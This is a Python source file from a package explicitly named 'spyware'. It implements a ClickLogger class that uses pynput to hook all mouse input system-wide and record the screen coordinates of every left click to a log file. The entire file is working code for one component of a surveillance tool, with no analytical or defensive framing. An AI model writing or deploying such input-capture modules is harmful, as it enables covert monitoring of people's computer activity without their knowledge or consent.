from pynput.mouse import Listener
from pynput.mouse import Button

from spyware.loggers.logger import Logger
from spyware.logs.clicklog import ClickLog

class ClickLogger(Logger):
    def __init__(self, filename: str) -> None:
        super().__init__(filename)

    def on_click(self, x: int, y: int, button: Button, pressed: bool) -> None:
        if button.name == "left" and pressed:
            ClickLog(x, y).store(self.filename)

    def listen(self):
        with Listener(on_click = self.on_click) as listener:
            listener.join()

